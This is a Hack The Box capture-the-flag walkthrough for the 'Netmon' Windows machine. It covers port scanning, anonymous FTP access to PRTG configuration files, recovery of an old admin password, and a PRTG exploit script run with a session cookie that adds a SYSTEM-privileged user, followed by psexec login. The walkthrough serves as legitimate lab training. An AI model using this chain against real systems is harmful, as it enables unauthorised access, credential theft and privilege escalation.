# Netmon

URL: https://app.hackthebox.com/machines/Netmon

Level: Easy

Date 8 Jun 2020

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.80 scan initiated Mon Jun  8 23:10:00 2020 as: nmap -p- -A -T4 -oN nmap.txt 10.10.10.152
Nmap scan report for 10.10.10.152
Host is up (0.045s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/8%OT=21%CT=1%CU=36072%PV=Y%DS=2%DC=T%G=Y%TM=5EDEAC87
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)
OS:OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54D
OS:NW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
OS:ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -4s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-06-08T21:24:13
|_  start_date: 2020-06-08T21:09:31

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   44.61 ms 10.10.14.1
2   45.24 ms 10.10.10.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  8 23:24:23 2020 -- 1 IP address (1 host up) scanned in 864.17 seconds
```

Webserver shows PRTG interface.

We also know that FTP allows anonymous access.

We do a Google research to unleash where PRTG stores credentials:

https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data

```
root@kali:/opt/htb/Netmon# ftp
ftp> open 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
07-16-16  09:28AM       <DIR>          All Users
02-03-19  08:05AM       <DIR>          Default
07-16-16  09:28AM       <DIR>          Default User
07-16-16  09:16AM                  174 desktop.ini
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd All Users
550 The system cannot find the file specified.
ftp> cd "All Users"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Application Data
02-03-19  08:05AM       <DIR>          Desktop
02-03-19  08:05AM       <DIR>          Documents
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  08:05AM       <DIR>          Start Menu
02-03-19  12:15AM       <DIR>          TEMP
02-03-19  08:05AM       <DIR>          Templates
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd "Application Data"
550 Access is denied.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd Paessler
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-03-20  04:45AM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-02-20  10:27PM       <DIR>          Configuration Auto-Backups
07-02-20  09:47PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
07-03-20  12:00AM       <DIR>          Logs (Web Server)
07-02-20  09:52PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
07-03-20  04:45AM              1715450 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp> exit
221 Goodbye.
```

File "PRTG Configuration.dat" shows encrypted credential:

```
root@kali:/opt/htb/Netmon# grep -A 20 prtgadmin "PRTG Configuration.dat"
                  prtgadmin
                </login>
                <name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
                  </cell>
                </password>
                <playsound>
                  0
```

While the other one...:

```
root@kali:/opt/htb/Netmon# grep -A 20 prtgadmin "PRTG Configuration.old.bak"
              <!-- User: prtgadmin -->
              PrTg@dmin2018
```

We can assume that now password has been replace with current year (2019).

From here,  we can access through web interface and grab cookie file.

Now we can use this exploit:

```
./prtg.sh -u http://10.10.10.152 -c "_ga=GA1.4.958955151.1591652317; _gid=GA1.4.2070767730.1591652317; OCTOPUS1813713946=e0JBRDY4Qjg1LTQxNUQtNDQ4Qy05QkFELTZBNjg3NDUyQUM3QX0%3D"
```

This exploit goal is to add a "pentest" user with SYSTEM privilege.

We can now access with `psexec` (from Impacket suite):

```
cd /opt/impacket/
psexec.py pentest:'P3nT3st!'@10.10.10.152
```

